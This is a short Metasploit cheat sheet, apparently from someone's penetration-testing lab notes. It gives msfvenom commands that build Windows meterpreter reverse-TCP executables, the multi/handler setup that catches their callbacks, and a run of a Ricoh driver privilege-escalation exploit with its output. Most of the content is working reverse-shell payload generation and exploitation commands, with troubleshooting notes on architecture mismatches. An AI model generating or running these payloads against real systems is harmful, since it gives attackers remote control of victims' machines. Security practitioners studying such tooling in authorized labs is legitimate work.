[MSFVenom - CheatSheet
 by hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)

[MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter by infinitelogins)](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

### Syntax (not case sensitive, variable can be used for LHOST)
```
msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP> -o <OUTPUT>
```

### Common 32 bit
```
myip=127.0.0.1

msfvenom -p windows/meterpreter/reverse_tcp lhost=$myip lport=3232 -f exe -o rev.exe
```

### Capture 32 vs 64 bit (exploit/multi/handler)
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp

# or

set payload windows/x64/meterpreter/reverse_tcp
```

### Examples 
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) >

msf6 exploit(multi/handler) > grep yes options
   LHOST                   yes       The listen address (an interface may be specified)                                              
   LPORT  4444             yes       The listen port
```

```
msfvenom -l payloads
```

```
msfvenom -l payloads |
```

## Common Mistake

### The payload should use the same architecture as the target driver
```
msf6 exploit(windows/local/ricoh_driver_privesc) > run 

[*] Started reverse TCP handler on 10.10.14.11:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[-] Exploit aborted due to failure: bad-config: The payload should use the same architecture as the target driver
[*] Deleting printer 
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/ricoh_driver_privesc) >
```
### 
```
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=$myip lport=1234 -a x64 -f exe -o rev64.exe           
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Error: The selected arch is incompatible with the payload
```

### 
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$myip lport=6464 -a x64 -f exe -o r64.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: r64.exe
```

### 
```
$ file r*     
r32.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 4 sections
r64.exe: PE32+ executable (GUI) x86-64, for MS Windows, 3 sections
```

### 
```

```
